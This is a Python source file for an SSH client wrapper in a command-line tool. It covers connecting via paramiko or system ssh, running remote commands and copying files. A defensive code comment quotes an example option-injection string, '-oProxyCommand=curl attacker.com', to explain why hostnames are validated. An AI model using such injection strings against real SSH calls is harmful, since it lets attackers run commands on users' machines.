"""SSH client wrapper — connect to remote machines via paramiko or system ssh."""
from __future__ import annotations

import logging
import re
import subprocess
from pathlib import Path

_log = logging.getLogger("ilx_cli.ssh")

# Only allow hostnames that are valid DNS labels or IPv4 dotted-quad.
# This blocks argument-injection strings like "-oProxyCommand=..." being
# passed as the host/user to the system ssh binary.
_SAFE_HOST_RE = re.compile(r'^[A-Za-z0-9]([A-Za-z0-9._-]{0,252}[A-Za-z0-9])?$')
_SAFE_USER_RE = re.compile(r'^[A-Za-z0-9._@+-]{1,64}$')


def _validate_ssh_target(user: str, host: str) -> tuple[bool, str]:
    """Return (ok, error) — validates that user/host are safe for subprocess ssh."""
    if not _SAFE_HOST_RE.match(host):
        return False, (
            f"Invalid SSH hostname {host!r}: only alphanumeric characters, "
            "dots, hyphens, and underscores are allowed. "
            "This prevents SSH option injection (e.g. -oProxyCommand)."
        )
    if not _SAFE_USER_RE.match(user):
        return False, (
            f"Invalid SSH username {user!r}: only alphanumeric characters and "
            ". _ @ + - are allowed."
        )
    return True, ""

SSH_HELP = """
SSH Password File Setup
=======================
ILX AI CLI can connect to remote machines using SSH keys (recommended) or a password file.

Option 1 — SSH Key (most secure):
  1. Generate a key pair:      ssh-keygen -t ed25519 -C "your@email"
  2. Copy public key to host:  ssh-copy-id user@hostname
  3. Use with ILX:             /ssh user@hostname

Option 2 — Password file (less secure, never commit to git):
  1. Create the file:          echo "your_password" > ~/.ilx_ssh_pass
  2. Restrict permissions:     chmod 600 ~/.ilx_ssh_pass   (Linux/Mac)
                               icacls %USERPROFILE%\\.ilx_ssh_pass /inheritance:r /grant:r "%USERNAME%:R"   (Windows)
  3. Use with ILX:             /ssh user@hostname --pass-file ~/.ilx_ssh_pass

  WARNING: Store passwords in a password manager, not plain text files, when possible.
"""


class SSHClient:
    """Thin wrapper around paramiko (preferred) or subprocess ssh/scp."""

    def __init__(
        self,
        host: str,
        user: str,
        port: int = 22,
        key_path: str | None = None,
        pass_file: str | None = None,
    ) -> None:
        self.host      = host
        self.user      = user
        self.port      = port
        self.key_path  = key_path
        self.pass_file = pass_file
        self._client   = None   # paramiko.SSHClient if available
        self._connected = False

    # ------------------------------------------------------------------
    # Connection
    # ------------------------------------------------------------------

    def connect(self) -> dict:
        """Connect via paramiko if available, else via subprocess ssh.

        Returns {"ok": bool, "error": str}.
        """
        if self._connected:
            return {"ok": True, "error": ""}

        # Validate host and user before passing them to paramiko or the system ssh
        # binary.  A malicious host string like "-oProxyCommand=curl attacker.com"
        # would be argument injection when passed as a list element to subprocess.
        ok, err = _validate_ssh_target(self.user, self.host)
        if not ok:
            return {"ok": False, "error": err}

        password = self._read_pass_file()

        # Try paramiko first
        try:
            import paramiko  # type: ignore
            client = paramiko.SSHClient()
            # Load persisted known hosts; reject unknown keys by default.
            known_hosts = Path.home() / ".ilx_cli" / "known_hosts"
            known_hosts.parent.mkdir(parents=True, exist_ok=True)
            if known_hosts.exists():
                client.load_host_keys(str(known_hosts))
            client.set_missing_host_key_policy(paramiko.RejectPolicy())
            connect_kwargs: dict = {
                "hostname": self.host,
                "port":     self.port,
                "username": self.user,
                "timeout":  15,
            }
            if self.key_path:
                connect_kwargs["key_filename"] = str(Path(self.key_path).expanduser())
            if password:
                connect_kwargs["password"] = password
            client.connect(**connect_kwargs)
            self._client = client
            self._connected = True
            _log.debug("Connected to %s@%s via paramiko", self.user, self.host)
            return {"ok": True, "error": ""}
        except ImportError:
            _log.debug("paramiko not available — falling back to subprocess ssh")
        except Exception as exc:
            return {"ok": False, "error": f"paramiko connect failed: {exc}"}

        # Subprocess ssh fallback — just run a no-op to check connectivity
        result = self._run_subprocess("echo connected")
        if result["ok"]:
            self._connected = True
            return {"ok": True, "error": ""}
        return {"ok": False, "error": result["stderr"] or result["error"]}

    # ------------------------------------------------------------------
    # Remote command execution
    # ------------------------------------------------------------------

    def run(self, command: str) -> dict:
        """Run a command on the remote machine.

        Returns {"ok": bool, "stdout": str, "stderr": str, "exit_code": int}.
        """
        if not self._connected:
            err = self.connect()
            if not err["ok"]:
                return {"ok": False, "stdout": "", "stderr": err["error"], "exit_code": -1}

        if self._client is not None:
            return self._run_paramiko(command)
        return self._run_subprocess(command)

    # ------------------------------------------------------------------
    # File transfer
    # ------------------------------------------------------------------

    def upload(self, local_path: str, remote_path: str) -> dict:
        """Upload a file via SFTP (paramiko) or scp (subprocess fallback).

        Returns {"ok": bool, "error": str}.
        """
        if not self._connected:
            err = self.connect()
            if not err["ok"]:
                return {"ok": False, "error": err["error"]}

        if self._client is not None:
            try:
                sftp = self._client.open_sftp()
                sftp.put(local_path, remote_path)
                sftp.close()
                return {"ok": True, "error": ""}
            except Exception as exc:
                return {"ok": False, "error": str(exc)}

        # scp fallback
        cmd = self._build_scp_cmd(local_path, f"{self.user}@{self.host}:{remote_path}")
        return self._run_local(cmd)

    def download(self, remote_path: str, local_path: str) -> dict:
        """Download a file from remote.

        Returns {"ok": bool, "error": str}.
        """
        if not self._connected:
            err = self.connect()
            if not err["ok"]:
                return {"ok": False, "error": err["error"]}

        if self._client is not None:
            try:
                sftp = self._client.open_sftp()
                sftp.get(remote_path, local_path)
                sftp.close()
                return {"ok": True, "error": ""}
            except Exception as exc:
                return {"ok": False, "error": str(exc)}

        # scp fallback
        cmd = self._build_scp_cmd(f"{self.user}@{self.host}:{remote_path}", local_path)
        return self._run_local(cmd)

    def close(self) -> None:
        """Disconnect from the remote machine."""
        if self._client is not None:
            try:
                self._client.close()
            except Exception:
                pass
            self._client = None
        self._connected = False

    # ------------------------------------------------------------------
    # Static helpers
    # ------------------------------------------------------------------

    @staticmethod
    def print_setup_help() -> None:
        """Print SSH_HELP to the terminal."""
        print(SSH_HELP)

    # ------------------------------------------------------------------
    # Internal helpers
    # ------------------------------------------------------------------

    def _read_pass_file(self) -> str | None:
        if not self.pass_file:
            return None
        p = Path(self.pass_file).expanduser()
        if not p.exists():
            _log.warning("Password file not found: %s", p)
            return None
        return p.read_text(encoding="utf-8").strip()

    def _base_ssh_args(self) -> list[str]:
        args = [
            "ssh",
            "-p", str(self.port),
            "-o", "StrictHostKeyChecking=accept-new",
            "-o", "BatchMode=yes",
        ]
        if self.key_path:
            args += ["-i", str(Path(self.key_path).expanduser())]
        return args

    def _run_subprocess(self, command: str) -> dict:
        """Run *command* on the remote host via system ssh."""
        args = self._base_ssh_args() + [f"{self.user}@{self.host}", command]
        return self._run_local(args)

    def _run_paramiko(self, command: str) -> dict:
        """Run *command* via an already-open paramiko channel."""
        try:
            stdin, stdout, stderr = self._client.exec_command(command, timeout=60)
            exit_code = stdout.channel.recv_exit_status()
            out = stdout.read().decode("utf-8", errors="replace")
            err = stderr.read().decode("utf-8", errors="replace")
            return {
                "ok":        exit_code == 0,
                "stdout":    out,
                "stderr":    err,
                "exit_code": exit_code,
            }
        except Exception as exc:
            return {"ok": False, "stdout": "", "stderr": str(exc), "exit_code": -1}

    def _build_scp_cmd(self, src: str, dst: str) -> list[str]:
        cmd = ["scp", "-P", str(self.port), "-o", "StrictHostKeyChecking=accept-new"]
        if self.key_path:
            cmd += ["-i", str(Path(self.key_path).expanduser())]
        cmd += [src, dst]
        return cmd

    @staticmethod
    def _run_local(cmd: list[str]) -> dict:
        """Run a local command, return structured result."""
        try:
            proc = subprocess.run(
                cmd,
                capture_output=True,
                text=True,
                encoding="utf-8",
                errors="replace",
                timeout=60,
            )
            ok = proc.returncode == 0
            return {
                "ok":        ok,
                "stdout":    proc.stdout,
                "stderr":    proc.stderr,
                "exit_code": proc.returncode,
                "error":     "" if ok else proc.stderr.strip(),
            }
        except FileNotFoundError:
            return {
                "ok":        False,
                "stdout":    "",
                "stderr":    "",
                "exit_code": -1,
                "error":     "ssh command not found. Install OpenSSH or paramiko.",
            }
        except subprocess.TimeoutExpired:
            return {
                "ok":        False,
                "stdout":    "",
                "stderr":    "",
                "exit_code": -1,
                "error":     "Command timed out after 60 seconds.",
            }
        except Exception as exc:
            return {
                "ok":        False,
                "stdout":    "",
                "stderr":    str(exc),
                "exit_code": -1,
                "error":     str(exc),
            }
